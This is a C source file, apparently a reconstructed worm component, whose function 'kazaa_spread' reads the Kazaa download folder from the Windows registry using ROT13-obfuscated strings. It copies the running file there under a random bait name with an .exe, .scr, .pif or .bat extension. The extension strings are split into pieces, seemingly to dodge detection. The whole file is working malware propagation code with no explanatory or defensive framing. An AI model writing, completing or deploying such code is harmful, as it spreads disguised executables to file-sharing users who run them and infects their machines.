#include "data_globals.h"
#include <stdlib.h>
#include <string.h>

#pragma optimize("", off)
void kazaa_spread(LPCSTR param_1)
{
    volatile struct _LocalCtx {
        char local_158[64];
        char local_178[32];
        HKEY local_118;
        DWORD local_114;
        BYTE local_110[256];
        int iVar4;
        int names_count;
        DWORD DVar2;
        LSTATUS LVar3;
    } ctx;

    // Initializations moved outside struct definition
    ctx.local_114 = 256;
    ctx.DVar2 = GetTickCount();
    srand(ctx.DVar2);
    ctx.names_count = KAZAA_NAMES_COUNT;

    memset(ctx.local_158, 0, sizeof(ctx.local_158));
    memset(ctx.local_178, 0, sizeof(ctx.local_178));

    _CiphStr((char *)ctx.local_158, "Fbsgjner\\Xnmnn\\Genafsre");
    _CiphStr((char *)ctx.local_178, "QyQve0");

    memset(ctx.local_110, 0, ctx.local_114);

    ctx.LVar3 = RegOpenKeyExA(HKEY_CURRENT_USER, (const char *)ctx.local_158, 0, KEY_QUERY_VALUE, &ctx.local_118);
    if (ctx.LVar3 != 0)
        return;

    ctx.LVar3 = RegQueryValueExA(ctx.local_118, (const char *)ctx.local_178, NULL, NULL, ctx.local_110, &ctx.local_114);
    if (ctx.LVar3 != 0)
        return;

    RegCloseKey(ctx.local_118);

    if (ctx.local_110[0] == '\0')
        return;

    ctx.iVar4 = strlen((char *)ctx.local_110);
    if (ctx.local_110[ctx.iVar4 - 1] == '/')
    {
        ctx.local_110[ctx.iVar4 - 1] = '\\';
    }

    ctx.iVar4 = strlen((char *)ctx.local_110);
    if (ctx.local_110[ctx.iVar4 - 1] != '\\')
    {
        ctx.local_110[ctx.iVar4] = '\\';
        ctx.local_110[ctx.iVar4 + 1] = '\0';
    }

    ctx.iVar4 = rand();
    strcpy((char *)(ctx.local_110 + strlen((char *)ctx.local_110)), kazaa_names[ctx.iVar4 % ctx.names_count]);
    strcat((char *)ctx.local_110, ".");

    ctx.iVar4 = rand() % 6;
    if (ctx.iVar4 == 0 || ctx.iVar4 == 1)
    {
        strcat((char *)ctx.local_110, "ex");
        strcat((char *)ctx.local_110, "e");
    }
    else if (ctx.iVar4 == 2 || ctx.iVar4 == 3)
    {
        strcat((char *)ctx.local_110, "sc");
        strcat((char *)ctx.local_110, "r");
    }
    else if (ctx.iVar4 == 4)
    {
        strcat((char *)ctx.local_110, "pi");
        strcat((char *)ctx.local_110, "f");
    }
    else
    {
        strcat((char *)ctx.local_110, "ba");
        strcat((char *)ctx.local_110, "t");
    }

    CopyFileA(param_1, (LPCSTR)ctx.local_110, TRUE);
    return;
}
#pragma optimize("", on)
